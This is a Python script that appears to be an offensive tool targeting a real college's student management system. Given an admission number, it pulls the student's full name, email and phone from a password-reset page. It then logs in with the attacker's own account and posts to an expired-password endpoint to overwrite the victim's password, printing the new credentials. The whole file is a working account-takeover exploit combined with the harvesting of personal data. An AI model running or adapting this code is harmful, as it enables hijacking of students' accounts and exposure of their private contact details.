import requests
from bs4 import BeautifulSoup
import random
from tkinter import ttk
from tkinter import *
import string
import sys
from time import sleep

session = requests.session()

class getData():
	def __init__(self, value):
		self.url_reset = "https://www.atc.ac.tz/sms/activation/password_reset.php"
		self.url_login = "https://www.atc.ac.tz/sms/index.php"
		self.url_hack = "https://atc.ac.tz/sms/expired_password.php"
		self.username = "" # ID no
		self.password = "" # Password
		self.header = {
		"Cache-Control": "max-age=0", 
		"Sec-Ch-Ua": "\"Chromium\";v=\"105\", \"Not)A;Brand\";v=\"8\"", 
		"Sec-Ch-Ua-Mobile": "?0", 
		"Sec-Ch-Ua-Platform": "\"Linux\"", 
		"Upgrade-Insecure-Requests": "1", 
		"Origin": "https://www.atc.ac.tz", 
		"Content-Type": "application/x-www-form-urlencoded", 
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36", 
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
		"Sec-Fetch-Site": "same-origin", 
		"Sec-Fetch-Mode": "navigate", 
		"Sec-Fetch-User": "?1", 
		"Sec-Fetch-Dest": "document", 
		"Referer": "https://www.atc.ac.tz/sms/index.php", 
		"Accept-Encoding": "gzip, deflate", 
		"Accept-Language": "en-US,en;q=0.9"
		}
		self.value = value

	def get(self):
		if self.value == "reset":
			return f"{self.url_reset}"
		elif self.value == "login":
			return f"{self.url_login}"
		elif self.value == "hack":
			return f"{self.url_hack}"
		elif self.value == "user":
			return f"{self.username}"
		elif self.value == "passwd":
			return f"{self.password}"
		elif self.value == "head":
			return self.header
		else:
			return -1

def getCookieCsrf():
	resp = session.get(getData("login").get())
	parse_html = BeautifulSoup(resp.text, "html.parser")
	csrf = parse_html.find("input", attrs={"name":"csrf_token"}).get("value")
	cookie = resp.cookies.get_dict()
	return [csrf, cookie]

csrfCookie = getCookieCsrf()

def genPass():
	letters = string.ascii_letters
	digits = string.digits
	special_chars = string.punctuation

	alphabet = letters + digits + special_chars
	pwd_length = 8
	pwd = ''
	while True:
		for i in range(pwd_length):
			pwd += ''.join(random.choice(alphabet))

		if (any(char in special_chars for char in pwd) and sum(char in digits for char in pwd)>=2 and any(char in string.ascii_uppercase for char in pwd)):
			break
		
	return pwd

def get_user(admission):
	data_rest = {"username": f"{admission}", "csrf_token": f"{csrfCookie[0]}", "Submit": ''}
	resp = session.post(getData("reset").get(), headers=getData("head").get(), cookies=csrfCookie[1], data=data_rest)
	parse_html = BeautifulSoup(resp.text, "html.parser")
	fullname = parse_html.find("input", attrs={"name":"fname"}).get("value")
	phone = parse_html.find("input", attrs={"name":"phone"}).get("value")
	email = parse_html.find("input", attrs={"name":"email"}).get("value")

	return [admission, email, phone, fullname]

def auth_cookie():
	data_log = {"username": f"{getData('user').get()}", "password": f"{getData('passwd').get()}", "csrf_token": f"{csrfCookie[0]}", "Submit": ''}
	resp = session.post(getData("login").get(), headers=getData("head").get(), cookies=csrfCookie[1], data=data_log)
	req = session.get("https://www.atc.ac.tz/sms/dashboard.php")
	if "SMS DASHBOARD" in req.text:
		return "success"
	else:
		return "failed"

def hackNow(admission, email, phone, password):
	data = {"email": f"{email}", "csrf_token": f"{csrfCookie[0]}", "username": f"{admission}", "id": f"{random.randint(10000, 99999)}", "phone": f"{phone}", "password": f"{password}", "password22": f"{password}", "Submit": "Change Password"}
	resp = session.post(getData("hack").get(), headers=getData("head").get(), cookies=csrfCookie[1], data=data)
	if "Password%20changed%20successfully" in resp.url:
		return "success"
	else:
		return "failed"

def progress(percent=0, width=30):
	hashes = width * percent // 100
	blanks = width - hashes

	print('\r[', hashes*'#', blanks*' ', ']', f' {percent:.0f}%', sep='', end='', flush=True)

def banner():
	ban = """\n$$$$$$$$\                  $$\                            $$$$$$\ $$$$$$$$\  $$$$$$\  
$$  _____|                 $$ |                          $$  __$$\\__$$  __|$$  __$$\ 
$$ |   $$\   $$\  $$$$$$$\ $$ |  $$\                     $$ /  $$ |  $$ |   $$ /  \__|
$$$$$\ $$ |  $$ |$$  _____|$$ | $$  |      $$$$$$\       $$$$$$$$ |  $$ |   $$ |      
$$  __|$$ |  $$ |$$ /      $$$$$$  /       \______|      $$  __$$ |  $$ |   $$ |      
$$ |   $$ |  $$ |$$ |      $$  _$$<                      $$ |  $$ |  $$ |   $$ |  $$\ 
$$ |   \$$$$$$  |\$$$$$$$\ $$ | \$$\                     $$ |  $$ |  $$ |   \$$$$$$  |
\__|    \______/  \_______|\__|  \__|                    \__|  \__|  \__|    \______/ """
	print(ban)
	print("\n\n")

def main():
	adm = sys.argv[1]
	banner()
	for fuck in "[+] starting tool...":
		print(fuck, end='', flush=True)
		sleep(0.1)
	print("\n")
	sleep(2)
	for fuck in "[+] connecting to atc.ac.tz...":
		print(fuck, end='', flush=True)
		sleep(0.1)
	sleep(2)
	print("\n")
	sleep(2)
	for fuck in f"[+] Checking info for {adm}":
		print(fuck, end='', flush=True)
		sleep(0.1)
	sleep(2)

	passwd = genPass()
	data = get_user(adm)
	print("\n")
	if data:
		for fuck in f"[+] Fullname : {data[3]}":
			print(fuck, end='', flush=True)
			sleep(0.1)
		print("")
		for fuck in f"[+] Email : {data[1]}":
			print(fuck, end='', flush=True)
			sleep(0.1)
		print("")
		for fuck in f"[+] Phone : {data[2]}":
			print(fuck, end='', flush=True)
			sleep(0.1)
	else:
		for fuck in f"[-] seems we get invalid admision":
			print(fuck, end='', flush=True)
			sleep(0.1)
		print("")
		sys.exit()
	sleep(2)
	print("\n")
	for fuck in f"[+] Attemping to Hack {data[0]}":
		print(fuck, end='', flush=True)
		sleep(0.1)
	sleep(2)
	print("\n")
	if auth_cookie() == "success":
		if hackNow(adm, data[1], data[2], passwd) == "success":
			#print("HACKED: {} : {}".format(adm, passwd))
			for fuck in f"[+] Boss We Are In :)":
				print(fuck, end='', flush=True)
				sleep(0.1)
			sleep(2)
			print("\n")
			for fuck in f"[+] Use This Password: {passwd}":
				print(fuck, end='', flush=True)
				sleep(0.1)
			sleep(2)
			print("\n")
			for fuck in f"USER: {adm}\nPASS: {passwd}":
				print(fuck, end='', flush=True)
				sleep(0.1)
			sleep(2)
		else:
			for fuck in f"[+] Hack Failed...":
				print(fuck, end='', flush=True)
				sleep(0.1)
			sleep(2)
	else:
		for fuck in f"[+] Error Occured...":
			print(fuck, end='', flush=True)
			sleep(0.1)
		sleep(2)


if __name__ == '__main__':
	main()
